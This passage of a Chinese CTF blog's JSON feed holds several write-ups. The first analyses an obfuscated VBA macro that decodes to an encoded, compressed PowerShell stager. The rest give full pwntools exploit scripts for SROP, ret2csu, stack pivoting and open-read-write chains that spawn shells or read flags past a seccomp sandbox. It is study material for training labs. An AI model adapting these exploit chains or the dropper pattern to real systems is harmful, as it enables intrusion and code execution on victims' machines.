“l3sd196txhtnIlFZyHBc5IKXxHCbTa5hLl3CBpEgbn1I2FFhaEsYCtVyQrkdPmA5X6CuFhjuRacVoM131pMLVE7IQDG717EZ5BdiLOc4pb+5Q1iMAXfQQ6soJrjxM8ZgjzQYO5WuQkQFdfko6QZEa&#x2F;0QaqhysOozj&#x2F;sTeoj2wI2A0C&#x2F;bwV35cV5EXJNOawqbWJCXdwzdsD8QjNhiDYGYFicJIRD5MBshvm1RGv1CZz54n+ziSgGe2vJ6GMy4cWv+i+hy0&#x2F;shNgvhVcKuJfuPZuFUUHtqD3w07yZKj2ma+iKYCvIRO9nu8lYOQpbbowha1OyfGzx7BJkvJxth3b1xoJaiNMRwQZz&#x2F;fiC8zvYxTlB0bsIHKR07xgI8gfCDd+NIhwL3YbdAor7ZfHhH3jNhBTykOlyrc&#x2F;0yLQSTR8dx0BC9QMIerbSCqZ1Q4rUGEPiXIVvXjtrEhnSBTZW4U5uJHfGQbzlVuuRRCUAjyIzGCDHbDCjvEgwbNLLEzqdeJrh9” “3K1WddVO4bwcKlQb14luWJzBsDwrD8u7vi8LTRIe6A982G0Oygf6+Am9m2GIkp6eSWY3tSF&#x2F;cOpmuWc+d1RCPzO5eEAm6TWT0ULWZ5QAMD31GObEpVRZ+eoCuDSckd0JvrP2lBSbZKRADL0unq3vhnmyTmflpvtH15ahJ+9mxgHGH2exGX6vgBx17iyx5T4WtBowQsIW310F1QrH6xNfvwM9PLv&#x2F;3czSXs&#x2F;&#x2F;jUDSB&#x2F;AN60pVccuZtfPvp+ZMg6d9l0UKNiWIq7CMKbE7Z7BWWjNEMBPdfGbNzmQULvHXOXpnlZeyNd0ht57x9PljoFDD6N+sEuJ2DRprg7&#x2F;qNZRJekOAF&#x2F;VIID2SPgDfCkRhLg+Xq5KgysBO4U5nWKGD0IM1TYcc24pbCY31beUlebiKc2aS7MtxQ+o41wQaJQ8Ys5h13jeNgpUz5Vzc6BGWDUm6+X+Jqu&#x2F;NK1qUy8Vmb5wXVl6BqFt6Y7yEGWv31QKTiVwyKWbuV+pRRYf3NvAqRX6n” “d1zFmAyuzoiVe1masPkUUjz2+uacpn8DuVpKrDJF64UDt4yhEeBsLHykecS+&#x2F;r0pwEBGJdP&#x2F;Vd&#x2F;Y3OJ4MFUqnF9UvaYfrFG7trJQepnGH2DE4WTFna70hp9Fxx8LaJMI8lxfwBDxH5Z56kkF+j4hLuzq48vpQNId4tn+rFfFeHwp2GuZrVMkyQ1SVSDW9uUAjWu6ROhPEGwyjnjM2cG6MJQmphOD8bIfjGnOAscgU0d6FN0BHzRtx85xZwO1Vw&#x3D;&#x3D;”)key &#x3D; base64decode(key_b64)​# 所有 ciphertext Array（按照 VBA 中顺序）arrays &#x3D; [ ([135, 46, 140, 24, 228, 225, 126, 169, 34, 40, 56], 3), ([201, 1], 14), ([137, 123, 117, 87, 89, 140, 200, 174, 138, 204, 135, 229, 75, 9, 168, 39, 117, 219, 2, 212, 118, 230, 128, 213, 197, 44, 99, 93, 193, 144, 49, 210, 70, 175, 228, 16, 187, 75, 36, 215, 144, 31, 223, 159, 127, 45, 9, 205, 183, 34], 16), ([199, 228, 3, 153, 81, 192, 25, 128, 137, 147, 136, 23, 7, 80, 224, 108, 203, 255, 197, 21, 174, 66, 117, 184, 52, 127, 71, 19, 183, 239, 29, 155, 18, 223, 159, 241, 35, 183, 202, 179, 22, 101, 99, 100, 54, 218, 32, 33, 142, 198, 175, 159, 29, 205, 110, 154, 65, 22, 247, 152, 91, 192, 108, 145, 58, 203, 25, 158, 99, 37, 128, 229, 54, 60, 38, 178, 134, 208, 68, 38, 39, 99, 76, 155, 56, 147, 53, 156, 203], 66), ([102, 198, 208, 164, 182, 203, 117, 231, 127, 219, 94, 126, 10, 162, 173, 72, 207, 156, 150, 219, 167, 117, 27, 172, 242, 233, 32, 72, 61, 65, 178, 142, 245, 133, 139, 29, 181, 134, 18, 199, 242, 233, 14, 5, 134, 127, 212, 91, 91, 8, 171, 90, 25, 109, 198, 97, 6, 157, 10, 45, 214, 27, 185, 134, 246, 145, 32, 196, 221, 131, 137, 27, 100, 146, 80, 67, 177, 161, 71, 193, 155, 175, 42, 192, 227, 172, 239, 123, 92], 155), ([234, 141, 79, 179, 223, 15, 203, 43, 171, 112, 201, 234, 98, 141, 170, 14, 174, 104, 46, 107, 122, 18, 176, 138, 238, 208, 78, 126, 217, 208, 197, 2, 219, 144, 118, 145, 213, 45, 173, 225, 233, 161, 66, 174, 198, 108, 46, 184, 249, 150, 178, 36, 223, 5, 41, 60, 105, 114, 110, 110, 40, 134, 139, 35, 41, 235, 57, 182, 60, 105, 58, 175, 196, 240, 224, 144, 250, 156, 14, 138, 217, 9, 147, 115, 55, 194, 186, 162, 79], 244), ([209, 193, 20, 114, 189, 230, 8, 167, 240, 61, 224, 242, 135, 166, 38, 7, 87, 151, 117, 148, 46, 97, 158, 117, 106, 143, 40, 126, 199, 26, 83, 196, 211, 16, 152, 203, 123, 22, 248, 60, 127, 38, 179, 12, 140, 170, 29, 148, 133, 77, 82, 213, 53, 92, 146, 151, 236, 151, 74, 37, 118, 16, 28, 157, 49, 18, 131, 195, 167, 133, 54, 214, 12, 248, 32, 108, 36, 131, 65, 250, 97, 12, 26, 10, 182, 16, 34, 15, 10], 333), ([81, 75, 148, 28, 3, 254, 84, 127, 57, 78, 30, 146, 239, 82, 115, 175, 20, 208, 87, 218, 140, 50, 189, 210, 111, 35, 12, 128, 1, 116, 208, 150, 230, 88, 166, 120, 35, 106, 166, 121, 243, 216, 251, 46, 25, 196, 102, 54, 130, 52, 233, 123, 103, 240, 146, 114, 144, 49, 205, 121, 89, 126, 226, 239, 23, 51, 71, 7, 184, 111, 154, 71, 39, 28, 191, 99, 43, 237, 59, 241, 187, 84, 205, 162, 82, 62, 227, 183, 145], 422), ([220, 194, 134, 110, 158, 136, 28, 157, 6, 28, 18, 29, 219, 15, 42, 69, 202, 26, 210, 214, 48, 60, 156, 210, 88, 81, 191, 153, 36, 72, 192, 205, 71, 101, 125, 96, 84, 172, 113, 120, 112, 252, 31, 16, 92, 180, 3, 4, 127, 58, 214, 173, 165, 31, 64, 250, 139, 176, 79, 89, 136, 249, 48, 37, 153, 201, 184, 51, 155, 186, 96, 121, 74, 163, 28, 131, 230, 74, 186, 237, 17, 163, 101, 17, 51, 1, 78, 40, 101], 511), ([173, 96, 11, 202, 44, 219, 158, 69, 217, 56, 179, 84, 118, 152, 185, 163, 20, 92, 3, 211, 142, 226, 92, 27, 150, 191, 222, 95, 105, 58, 87, 200, 109, 108, 90, 41, 190, 252, 39, 215, 215, 150, 117, 140, 19, 0, 206, 174, 60, 83, 253, 136, 153, 112, 28, 55, 54, 1, 131, 65, 74, 92, 97, 135, 64, 80, 192, 181, 183, 54, 130, 9, 197, 65, 182, 38, 196, 1, 248, 217, 155, 50, 57, 1, 135, 114, 53, 68, 126], 600), ([246, 123, 20, 204, 50, 152, 85, 111, 106, 210, 2, 247, 48, 159, 65, 255, 33, 131, 91, 157, 245, 204, 232, 223, 23, 163, 243, 109, 81, 181, 198, 99, 13, 150, 202, 151, 133, 228, 53, 192, 53, 212, 255, 30, 218, 222, 76, 176, 230, 46, 127, 0, 251, 133, 0, 75, 6, 98, 143, 221, 135, 70, 86, 153, 72, 105, 167, 91, 77, 86, 67, 240, 157, 143, 239, 49, 103, 247, 44, 158, 232, 23, 50, 225, 15, 179, 237, 94, 120], 689), ([21, 83, 142, 200, 60, 47, 222, 133, 241, 121, 102, 78, 134, 204, 252, 118, 74, 8, 97, 95, 138, 94, 62, 159, 44, 75, 147, 70, 175, 185, 75, 205, 218, 38, 251, 211, 199, 207, 11, 12, 118, 242, 74, 62, 19, 187, 36, 239, 38, 120, 58, 21, 17, 110, 113, 192, 57, 6, 111, 168, 102, 244, 147, 53, 151, 47, 247, 65, 123, 74, 183, 87, 167, 131, 236, 21, 60, 168, 168, 109, 249, 113, 164, 208, 138, 110, 252, 219, 183], 778), ([220, 77, 218, 41, 229, 2, 88, 252, 106, 253, 236, 187, 215, 59, 193, 15, 32, 150, 231, 159, 48, 149, 160, 224, 111, 182, 39, 147, 118, 135, 109, 38, 249, 118, 63, 205, 247, 94, 37, 175, 100, 222, 164, 108, 71, 245, 42, 113, 7, 181, 87, 188, 28, 71, 172, 75, 129, 136, 82, 8, 238, 65, 105, 125, 243, 190, 156, 168, 181, 28, 153, 190, 197, 25, 147, 84, 135, 79, 188, 11, 18, 30, 138, 195, 228, 177, 172, 230, 163], 867), ([116, 194, 246, 44, 213, 63, 75, 126, 78, 201, 230, 241, 205, 28, 240, 125, 46, 241, 50, 61, 113, 118, 113, 86, 190, 61, 41, 156, 140, 82, 85, 106, 154, 150, 116, 59, 37, 253, 214, 245, 112, 156, 68, 246, 220, 182, 181, 189, 58, 225, 9, 164, 170, 238, 237, 86, 187, 55, 95, 125, 41, 240, 254, 175, 112, 213, 7, 13, 2, 246, 86, 176, 29, 97, 105, 229, 127, 121, 158, 77, 51, 32, 116, 104, 213, 158, 211, 231, 161], 956), ([129, 43, 134, 12, 8, 25, 228, 210, 145, 230, 100, 15, 197, 93, 157, 207, 26, 89, 220, 180, 84, 164, 102, 26, 249, 193, 34, 39, 225, 173, 136, 48, 2, 189, 79, 149, 126, 91, 99, 100, 89, 230, 239, 55, 238, 118, 200, 215, 212, 103, 180, 29, 169, 169, 86, 253, 76, 43, 205, 184, 10, 200, 239, 162, 140, 127, 45, 214, 133, 132, 32, 46, 221, 66, 49, 28, 237, 233, 29, 55, 34, 233, 243, 91, 27, 182, 146, 58, 210], 1045), ([221, 59, 115, 92, 39, 169, 26, 171, 5, 50, 197, 131, 119, 184, 107, 4, 29, 192, 53, 48, 132, 208, 65, 239, 155, 255, 215, 11, 24, 223, 136, 184, 64, 53, 126, 130, 187, 163, 164, 231, 37, 66, 251, 28, 11, 234, 2, 4, 164, 226, 66, 129, 205, 228, 64, 161, 54, 125, 62, 224, 56, 131, 134, 191, 223, 120, 130, 17, 7, 109, 154, 190, 7, 142, 154, 136, 163, 62, 125, 20, 97, 205, 30, 51, 252, 229, 116, 237, 29], 1134), ([250, 244, 208, 17, 50, 212, 135, 122, 49, 134, 155, 37, 131, 204, 239, 166, 215, 221, 49, 134, 92, 63, 41, 197, 73, 176, 26, 30, 134, 119, 176, 123, 215, 56, 159, 8, 66, 175, 127, 67, 73, 174, 128, 162, 142, 209, 1, 136, 92, 160, 147, 191, 233, 99, 132, 42, 11, 107, 188, 42, 221, 194, 18, 107, 174, 79, 16, 20, 104, 155, 183, 188, 119, 207, 27, 251, 1, 131, 14, 91, 61, 115, 233, 57, 143, 178, 128, 246, 87], 1223), ([214, 95, 231, 84, 214, 176, 235, 78, 206, 44, 143, 68, 150, 97, 49, 48, 56, 82, 156, 68, 43, 117, 63, 134, 143, 30, 38, 64, 222, 22], 1312)]​​# 拼接解密结果result &#x3D; “”for arr, start in arrays: result +&#x3D; unxor(arr, start, key)​print(“解密结果:”, result)​​#解密结果: WScript.Shellpowershell -e LgAoACcAaQBlAFgAJwApACgAbgBFAHcALQBvAGIAagBFAGMAdAAgAFMAWQBzAHQAZQBNAC4ASQBvAC4AUwB0AFIAZQBBAE0AcgBlAGEAZABFAHIAKAAgACgAIABuAEUAdwAtAG8AYgBqAEUAYwB0ACAAIABTAHkAcwB0AEUATQAuAEkATwAuAEMATwBNAFAAUgBFAHMAcwBpAE8ATgAuAGQAZQBmAGwAYQBUAEUAUwB0AHIAZQBhAE0AKABbAEkAbwAuAE0AZQBtAG8AUgB5AHMAVABSAEUAQQBNAF0AIABbAHMAWQBzAFQAZQBNAC4AYwBPAG4AdgBFAHIAVABdADoAOgBmAFIATwBNAEIAQQBTAEUANgA0AFMAVAByAGkAbgBnACgAIAAnAGIAYwA2ADkAQwBzAEkAdwBHAEkAWABoAFAAVgBmAHgARwBSAHcAVQBMAEwAUwBrAGsAcwBsAEIAQgBYADkAQQBVAEIAdwBVAHAAOQBBAG0AbgA3AFEAUQBtADUAcQBrAFIAcABIAGUAdQB5ADAANgBPAHAAOABIAHoAbwB1AHkATQBFAEEAdgA2AEMAWQBRAEUATABSADUASQBKAHcAVwA4AHcARQBsAFoARgBoAFcAZABlAE4AaABCAGsAZgBNAFYATABRAHgAegBnAE0AOQBaAE0ANABGAFkAMQBVADMAbAAxAGMAWQAvAFUAaQBFAGQANgBDAHIAMwBYAHoAOQBEAG4ARQBRAHYARwBDAEMAMwBYAEsAbQBGAEYAUABpAGsAYQBjAGkAcQBVAFMASQByAFIASgBwAHcAKwBOAGIAeQBoAE8AWgBhAHYAMABTADcATQBsAGsAdwB6AHYAUwArAHoAbwBPAHoARQA0AEwAcAByAFcAWQBTAHAAdgBVAHYASwBWAGoAZQBCAE8AQQBzAHkAMAA5AFIAdgB2AEcAOQB6ADkAMABhAGEAeABGADYAYgB1ADYARgBsAEEANwAvAEUATwAyAGwAZgB5AGkAegBoAEQAeQBBAFEAPQA9ACcAKQAsACAAWwBzAFkAUwB0AEUATQAuAGkAbwAuAEMATwBNAFAAUgBlAFMAUwBpAG8ATgAuAGMATwBtAHAAcgBlAHMAUwBpAE8ATgBtAE8AZABFAF0AOgA6AEQAZQBDAG8AbQBQAHIARQBTAFMAKQAgACkALABbAHMAeQBzAFQARQBtAC4AVABFAFgAdAAuAGUAbgBjAE8AZABJAE4ARwBdADoAOgBBAHMAYwBpAEkAKQAgACkALgByAGUAYQBEAFQAbwBFAE4ARAAoACkA Base64 编码的 PowerShell 命令 import base64​encoded &#x3D; “LgAoACcAaQBlAFgAJwApACgAbgBFAHcALQBvAGIAagBFAGMAdAAgAFMAWQBzAHQAZQBNAC4ASQBvAC4AUwB0AFIAZQBBAE0AcgBlAGEAZABFAHIAKAAgACgAIABuAEUAdwAtAG8AYgBqAEUAYwB0ACAAIABTAHkAcwB0AEUATQAuAEkATwAuAEMATwBNAFAAUgBFAHMAcwBpAE8ATgAuAGQAZQBmAGwAYQBUAEUAUwB0AHIAZQBhAE0AKABbAEkAbwAuAE0AZQBtAG8AUgB5AHMAVABSAEUAQQBNAF0AIABbAHMAWQBzAFQAZQBNAC4AYwBPAG4AdgBFAHIAVABdADoAOgBmAFIATwBNAEIAQQBTAEUANgA0AFMAVAByAGkAbgBnACgAIAAnAGIAYwA2ADkAQwBzAEkAdwBHAEkAWABoAFAAVgBmAHgARwBSAHcAVQBMAEwAUwBrAGsAcwBsAEIAQgBYADkAQQBVAEIAdwBVAHAAOQBBAG0AbgA3AFEAUQBtADUAcQBrAFIAcABIAGUAdQB5ADAANgBPAHAAOABIAHoAbwB1AHkATQBFAEEAdgA2AEMAWQBRAEUATABSADUASQBKAHcAVwA4AHcARQBsAFoARgBoAFcAZABlAE4AaABCAGsAZgBNAFYATABRAHgAegBnAE0AOQBaAE0ANABGAFkAMQBVADMAbAAxAGMAWQAvAFUAaQBFAGQANgBDAHIAMwBYAHoAOQBEAG4ARQBRAHYARwBDAEMAMwBYAEsAbQBGAEYAUABpAGsAYQBjAGkAcQBVAFMASQByAFIASgBwAHcAKwBOAGIAeQBoAE8AWgBhAHYAMABTADcATQBsAGsAdwB6AHYAUwArAHoAbwBPAHoARQA0AEwAcAByAFcAWQBTAHAAdgBVAHYASwBWAGoAZQBCAE8AQQBzAHkAMAA5AFIAdgB2AEcAOQB6ADkAMABhAGEAeABGADYAYgB1ADYARgBsAEEANwAvAEUATwAyAGwAZgB5AGkAegBoAEQAeQBBAFEAPQA9ACcAKQAsACAAWwBzAFkAUwB0AEUATQAuAGkAbwAuAEMATwBNAFAAUgBlAFMAUwBpAG8ATgAuAGMATwBtAHAAcgBlAHMAUwBpAE8ATgBtAE8AZABFAF0AOgA6AEQAZQBDAG8AbQBQAHIARQBTAFMAKQAgACkALABbAHMAeQBzAFQARQBtAC4AVABFAFgAdAAuAGUAbgBjAE8AZABJAE4ARwBdADoAOgBBAHMAYwBpAEkAKQAgACkALgByAGUAYQBEAFQAbwBFAE4ARAAoACkA” # 你的字符串decoded_bytes &#x3D; base64.b64decode(encoded) # Base64 解码decoded_str &#x3D; decoded_bytes.decode(‘utf-16le’) # UTF-16 LE 解码​print(decoded_str)​##.(‘ieX’)(nEw-objEct SYsteM.Io.StReAMreadEr( ( nEw-objEct SystEM.IO.COMPREssiON.deflaTEStreaM([Io.MemoRysTREAM] [sYsTeM.cOnvErT]::fROMBASE64STring( ‘bc69CsIwGIXhPVfxGRwULLSkkslBBX9AUBwUp9Amn7QQm5qkRpHeuy06Op8HzouyMEAv6CYQELR5IJwW8wElZFhWdeNhBkfMVLQxzgM9ZM4FY1U3l1cY&#x2F;UiEd6Cr3Xz9DnEQvGCC3XKmFFPikaciqUSIrRJpw+NbyhOZav0S7MlkwzvS+zoOzE4LprWYSpvUvKVjeBOAsy09RvvG9z90aaxF6bu6FlA7&#x2F;EO2lfyizhDyAQ&#x3D;&#x3D;’), [sYStEM.io.COMPReSSioN.cOmpresSiONmOdE]::DeComPrESS) ),[sysTEm.TEXt.encOdING]::AsciI) ).reaDToEND() 典型的混淆压缩 Base64 payload 解码脚本 import base64import zlib​# 1. Base64 字符串b64_data &#x3D; ‘bc69CsIwGIXhPVfxGRwULLSkkslBBX9AUBwUp9Amn7QQm5qkRpHeuy06Op8HzouyMEAv6CYQELR5IJwW8wElZFhWdeNhBkfMVLQxzgM9ZM4FY1U3l1cY&#x2F;UiEd6Cr3Xz9DnEQvGCC3XKmFFPikaciqUSIrRJpw+NbyhOZav0S7MlkwzvS+zoOzE4LprWYSpvUvKVjeBOAsy09RvvG9z90aaxF6bu6FlA7&#x2F;EO2lfyizhDyAQ&#x3D;&#x3D;’​# 2. Base64 解码compressed_bytes &#x3D; base64.b64decode(b64_data)​# 3. DEFLATE 解压（PowerShell 的 DeflateStream 对应 zlib.decompress）# 注意：DeflateStream 不包含 zlib 头，所以使用 -15 window bitsdecompressed_bytes &#x3D; zlib.decompress(compressed_bytes, -15)​# 4. 按 ASCII 编码读取decoded_script &#x3D; decompressed_bytes.decode(‘ascii’)​print(decoded_script)​​ 最后结果 123456789echo &quot;Yes, we love VBA!&quot;$input = Read-Host &quot;Password&quot;if ($input -eq &quot;FLAG&#123;w0w_7h3_3mb3dd3d_vb4_1n_w0rd_4u70m471c4lly_3x3cu73d_7h3_p0w3r5h3ll_5cr1p7&#125;&quot;) &#123; Write-Output &quot;Correct!&quot;&#125; else &#123; Write-Output &quot;Incorrect&quot;&#125; c-wgb使用ida进行逆向分析 找到ba函数就发现flag直接有了","categories":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}],"tags":[{"name":"WP","slug":"WP","permalink":"http://example.com/tags/WP/"}]},{"title":"SROP","slug":"SROP","date":"2025-09-10T07:25:03.000Z","updated":"2025-09-11T02:56:23.735Z","comments":true,"path":"2025/09/10/SROP/","permalink":"http://example.com/2025/09/10/SROP/","excerpt":"","text":"syscall_leaverootersctf_2019_srop 可以看到这个什么都没有，但是存在pop rax的操作，所以可以用SROP来泄露后门函数 思路用SROP第一次读入执行read函数，第二次向这个read函数读入&#x2F;bin&#x2F;sh，并让函数通过frame去执行它 注意，在第一次的rbp控制，他是通过leave_ret跳转的，这个rbp是要执行函数的前一个位置，所以在第二个payload构造的时候加上“&#x2F;bin&#x2F;sh\\x00”一共要填充0x38个字节才到达我们构造的read函数执行结束之后会继续执行的位置 脚本12345678910111213141516171819202122232425262728293031323334353637383940414243444546from pwn import *import sysfrom LibcSearcher import *file_path = &quot;./rootersctf_2019_srop&quot;remote_host = &quot;node5.buuoj.cn&quot;remote_port =27430#libc=ELF(&quot;&quot;)context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)elf = ELF(file_path)if &#x27;re&#x27; in sys.argv: p = remote(remote_host, remote_port)else: p = process(file_path) #gdb.attach(p, &quot;b*0x000000000401035&quot;)def sla(a, b): p.sendlineafter(a, b)def sa(a,b): p.sendafter(a,b)rax_sys_kea_ret=0x401032bss=0x402000syscall=0x401033frame=SigreturnFrame()frame.rax=0frame.rdi=0frame.rsi=bssframe.rdx=0x400frame.rip=syscallframe.rbp=bss+0x30payload=b&quot;a&quot;*0x88+p64(rax_sys_kea_ret)+p64(15)+bytes(frame)sa(b&quot;Hey, can i get some feedback for the CTF?&quot;,payload)frame=SigreturnFrame()frame.rax=59frame.rdi=bssframe.rsi=0frame.rdx=0frame.rip=syscallpay=b&quot;/bin/sh\\x00&quot;+b&quot;a&quot;*0x30+p64(rax_sys_kea_ret)+p64(15)+bytes(frame)p.sendline(pay)p.interactive() call_syscall题目 思路可以看到，开启了pie保护，但程序会输出puts的地址，可以通过puts的地址去泄露libc基地址，但是canary保护限制了执行的范围，所以可以通过syscall(15)去使用SigreturnFrame，设计寄存器让函数输入&#x2F;flaghe orw的攻击，最后控制rsp去执行这个orw 这里不是syscall，而是调用syscall，调用会push rsp，会导致不满16字节，所以舍去我们构造的frame的前8个字节 详解可以看师傅不会修电脑的师傅 脚本123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354from pwn import *import sysfrom LibcSearcher import *file_path = &quot;./babypwn&quot;remote_host = &quot;node5.buuoj.cn&quot;remote_port = 26643libc = ELF(&quot;libc-2.23.so&quot;)context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)elf = ELF(file_path)if &#x27;re&#x27; in sys.argv: p = remote(remote_host, remote_port)else: p = process(file_path) #gdb.attach(p, &quot;b* printf&quot;)def sla(a, b): p.sendlineafter(a, b)def sa(a,b): p.sendafter(a,b)p.recvuntil(b&quot;0x&quot;)puts = int(p.recv(12), 16)print(b&quot;puts==================&quot;+hex(puts).encode())libc_base= puts - libc.symbols[&quot;puts&quot;]open_addr = libc_base + libc.symbols[&#x27;open&#x27;] read_addr = libc_base + libc.symbols[&#x27;read&#x27;]write_addr = libc_base + libc.symbols[&#x27;write&#x27;]bss = libc_base + 0x00000000003c6000rdi = libc_base + 0x21102 rsi = libc_base + 0x202e8 rdx = libc_base + 0x1b92 frame = SigreturnFrame()frame.rdi = 0frame.rsi = bssframe.rdx = 0x200frame.rip = read_addrframe.rsp = bss+8pay = bytes(frame)[8:]p.sendlineafter(b&#x27;Please input magic message: &#x27;, pay)payload = b&quot;/flag\\x00\\x00\\x00&quot;+p64(rdi) + p64(bss) + p64(rsi) + p64(0) + p64(open_addr)payload += p64(rdi) + p64(3) + p64(rsi) + p64(bss) + p64(rdx) + p64(0x100) + p64(read_addr)payload += p64(rdi) + p64(1) + p64(rsi) + p64(bss) + p64(rdx) + p64(0x100) + p64(write_addr)p.sendline(payload)p.interactive()","categories":[{"name":"pwn_study","slug":"pwn-study","permalink":"http://example.com/categories/pwn-study/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"http://example.com/tags/PWN/"},{"name":"SROP","slug":"SROP","permalink":"http://example.com/tags/SROP/"}]},{"title":"odd_canary","slug":"odd-canary","date":"2025-09-09T12:09:33.000Z","updated":"2025-09-09T12:09:33.907Z","comments":true,"path":"2025/09/09/odd-canary/","permalink":"http://example.com/2025/09/09/odd-canary/","excerpt":"","text":"","categories":[{"name":"exercise_pwn","slug":"exercise-pwn","permalink":"http://example.com/categories/exercise-pwn/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"http://example.com/tags/PWN/"}]},{"title":"[HNCTF 2022 WEEK2]ret2csu","slug":"HNCTF-2022-WEEK2-ret2csu","date":"2025-09-08T10:28:12.000Z","updated":"2025-09-09T05:24:30.413Z","comments":true,"path":"2025/09/08/HNCTF-2022-WEEK2-ret2csu/","permalink":"http://example.com/2025/09/08/HNCTF-2022-WEEK2-ret2csu/","excerpt":"","text":"题目 分析 可以看到没有system函数，而且只能通过write去泄露，write有三个参数，但是pop指令不够 所以要用csu 整理一下思路 先通过pop那一块操作把我们要的值放入对应的寄存器中，然后再调用mov函数去设置我们需要的寄存器，注意add rsp跳过一个位置，以及6个pop指令一共处理了56个字节，所以要填补上 也就是说在执行完一次pop和mov操作之后会再次进入pop，要填充足够的字节rsp到达我们的ret地址处然后改变返回地址 所以 脚本12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455from pwn import *import sysfrom LibcSearcher import *file_path = &quot;./ret2csu&quot;remote_host = &quot;node5.anna.nssctf.cn&quot;remote_port = 20627libc=ELF(&quot;./libc.so.6&quot;)context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)elf = ELF(file_path)if &#x27;re&#x27; in sys.argv: p = remote(remote_host, remote_port)else: p = process(file_path) #gdb.attach(p, &quot;b*0x04012D7&quot;)def sla(a, b): p.sendlineafter(a, b)def sa(a,b): p.sendafter(a,b)write_got = elf.got[&#x27;write&#x27;]read_got = elf.got[&#x27;read&#x27;]main= 0x4011DCrdi = 0x4012b3ret= 0x40101apop6=0x4012AAmov=0x401290p.recvuntil(b&quot;Input:\\n&quot;)payload = b&#x27;a&#x27;*0x108 + p64(pop6)payload += p64(0) + p64(1) + p64(1)payload += p64(write_got) + p64(8) + p64(write_got)payload += p64(mov) +b&quot;a&quot;*56+ p64(main)p.sendline(payload)p.recvuntil(b&quot;Ok.\\n&quot;)write= u64(p.recv(6).ljust(8,b&#x27;\\x00&#x27;))print(&quot;write:&quot;,hex(write))libc_base = write- libc.symbols[&#x27;write&#x27;]system_addr = libc_base + libc.symbols[&#x27;system&#x27;]bin_sh_addr = libc_base + next(libc.search(b&#x27;/bin/sh&#x27;))payload2 = b&#x27;a&#x27;*0X108+ p64(ret) + p64(rdi) + p64(bin_sh_addr) + p64(system_addr)delimiter = &#x27;Input:\\n&#x27;p.sendlineafter(delimiter, payload2)p.interactive()","categories":[{"name":"exercise_pwn","slug":"exercise-pwn","permalink":"http://example.com/categories/exercise-pwn/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"http://example.com/tags/PWN/"},{"name":"csu","slug":"csu","permalink":"http://example.com/tags/csu/"}]},{"title":"[NSSRound#14 Basic]rbp","slug":"NSSRound-14-Basic-rbp","date":"2025-09-01T13:54:30.000Z","updated":"2025-09-03T10:56:34.158Z","comments":true,"path":"2025/09/01/NSSRound-14-Basic-rbp/","permalink":"http://example.com/2025/09/01/NSSRound-14-Basic-rbp/","excerpt":"","text":"题目 可以看到是栈迁移，而且是只有read输入的类型，考虑lea类型 因为read读入数据之后哈有个puts输出，为了防止发送数据的时机不对，我们控制lea在输出try it之前，以控制程序执行流程 又看到沙盒，在程序中验证 允许所有系统调用， 唯独禁止 execve（也就是不能直接 execve(&quot;/bin/sh&quot;)） 所以用沙盒 open, read,write 脚本123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from pwn import *#io=process(&#x27;./rbp&#x27;)io=remote(&quot;node4.anna.nssctf.cn&quot;,28726)#gdb.attach(io, &quot;b*0x4012BF&quot;)elf=ELF(&#x27;./rbp&#x27;)libc=ELF(&#x27;./libc.so.6&#x27;)bss=0x404800leave=p64(0x4012BF)payload=b&#x27;a&#x27;*0x210+p64(bss)+p64(0x40127F)io.sendafter(b&quot;try it\\n&quot;,payload)io.recvline()rdi=p64(0x401353)rbp=0X40126Elea=0x401286# payload=p64(bss+0x600)+rdi+p64(elf.got[&#x27;puts&#x27;])+p64(elf.plt[&#x27;puts&#x27;])+p64(lea)# payload=payload.ljust(0x210,b&#x27;\\x00&#x27;)# payload+=p64(bss-0x210)+leavepayload=rdi+p64(elf.got[&#x27;puts&#x27;])+p64(elf.plt[&#x27;puts&#x27;])+p64(rbp)+p64(bss+0x600)+p64(lea)payload=payload.ljust(0x210,b&#x27;\\x00&#x27;)payload+=p64(bss-0x210-8)+leaveio.sendafter(b&quot;try it\\n&quot;,payload)io.recvline()puts_add=u64(io.recv(6).ljust(8,b&#x27;\\x00&#x27;))print(b&quot;puts===========================&quot;+hex(puts_add).encode())offset=puts_add-libc.sym[&#x27;puts&#x27;] success(&#x27;offset: &#x27;+hex(offset)) openn=offset+libc.sym[&#x27;open&#x27;]read=offset+libc.sym[&#x27;read&#x27;]write=offset+libc.sym[&#x27;write&#x27;] rsi=p64(offset+0x2601f)rdx=p64(offset+0x142c92) payload=b&#x27;/flag\\x00\\x00\\x00&#x27;payload+=rdi+p64(bss+0x600-0x210)+rsi+p64(0)+rdx+p64(0)+p64(openn)payload+=rdi+p64(3)+rsi+p64(bss)+rdx+p64(0x50)+p64(read)payload+=rdi+p64(1)+rsi+p64(bss)+rdx+p64(0x50)+p64(write)payload=payload.ljust(0x210,b&#x27;\\x00&#x27;)payload+=p64(bss+0x600-0x210)+leaveio.sendafter(b&quot;try it\\n&quot;,payload) io.interactive() 收获rbp控制123payload=p64(bss+0x600)+rdi+p64(elf.got[&#x27;puts&#x27;])+p64(elf.plt[&#x27;puts&#x27;])+p64(lea)payload=payload.ljust(0x210,b&#x27;\\x00&#x27;)payload+=p64(bss-0x210)+leave 在payload最开始控制rbp，让函数跳转过去之后第一个pop为rbp,最后直接lea跳转执行raed函数 orw的系统调用1234567payload=b&#x27;/flag\\x00\\x00\\x00&#x27;payload+=rdi+p64(bss+0x600-0x210)+rsi+p64(0)+rdx+p64(0)+p64(openn)payload+=rdi+p64(3)+rsi+p64(bss)+rdx+p64(0x50)+p64(read)payload+=rdi+p64(1)+rsi+p64(bss)+rdx+p64(0x50)+p64(write)payload=payload.ljust(0x210,b&#x27;\\x00&#x27;)payload+=p64(bss+0x600-0x210)+leaveio.sendafter(b&quot;try it\\n&quot;,payload) 